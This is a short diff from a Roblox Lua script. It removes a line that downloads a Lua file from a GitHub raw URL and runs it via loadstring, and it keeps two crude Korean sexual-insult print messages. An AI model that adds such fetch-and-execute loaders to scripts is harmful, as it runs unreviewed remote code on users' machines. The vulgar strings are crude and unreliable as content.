@@ -29,7 +29,6 @@ UserInputService.InputBegan:Connect(function(input, isProcessed)
     end
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yunjun3737-ship-it/ftap-np/main/AIPA2.lua-1-1.txt"))()
 print("이메세지가보인다면 당신은 발기부전입니다")
 print("보지털 팝니다")
 local Players = game:GetService("Players")
